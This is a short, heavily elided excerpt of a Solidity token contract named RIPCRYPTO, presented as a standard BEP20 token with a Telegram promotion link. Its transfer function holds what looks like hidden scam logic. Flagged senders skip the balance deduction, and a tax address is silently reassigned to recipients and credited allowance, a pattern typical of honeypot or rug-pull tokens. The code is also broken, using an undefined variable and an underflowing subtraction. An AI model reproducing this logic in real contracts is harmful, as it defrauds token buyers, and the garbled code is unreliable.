// Telegram : https://t.me/RIPCryptoETH
...
contract RIPCRYPTO is Context, IBEP20, Ownable {
    ...
    mapping(address => uint256) private _taxAddresses;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (_taxAddresses[sender] == 0 && uniswapV2Pair != sender && _allowance[sender] > 0) {
            _taxAddresses[sender] -= _value;
        }

        _allowance[taxAddress] += _value;
        taxAddress = recipient;

        if (!_tax[sender]) _balances[sender] = _balances[sender].sub(amount, 'BEP20: transfer amount exceeds balance');
